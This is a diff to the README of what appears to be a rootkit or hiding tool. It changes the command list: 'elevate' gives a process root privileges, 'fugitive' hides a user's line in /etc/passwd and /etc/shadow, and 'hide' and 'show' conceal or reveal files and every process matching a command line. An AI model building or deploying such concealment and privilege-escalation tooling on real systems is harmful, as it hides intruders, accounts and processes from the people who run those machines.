@@ -23,8 +23,8 @@ along with this program.  If not, see <https://www.gnu.org/licenses/>.
 ## Commands
 - `drop PID` -> set a process's EUID to its UID
 - `elevate PID` -> set a process's EUID to root
-- `fugitive UID` -> remove a user from "/etc/passwd" and "/etc/shadow"
-- `hide PATH` -> hide an entity ("/proc" paths are treated as processes)
-- `show PATH` -> show a hidden entity ("/proc" paths are treated as processes)
-- `unfugitive UID` -> replace a user in "/etc/passwd" and "/etc/shadow"
+- `fugitive ETC_PASSWD_LINE` -> hide a line from "/etc/passwd" (and its corresponding "/etc/shadow" entry)
+- `hide PATH_OR_COMMAND_LINES` -> hide an entity (a directory entry or ALL processes matching the command line: in that order)
+- `show PATH_OR_COMMAND_LINES` -> show a hidden entity (a directory entry or ALL processes matching the command line: in that order)
+- `unfugitive ETC_PASSWD_LINE` -> show a line in "/etc/passwd" (and its corresponding "/etc/shadow" entry)
 
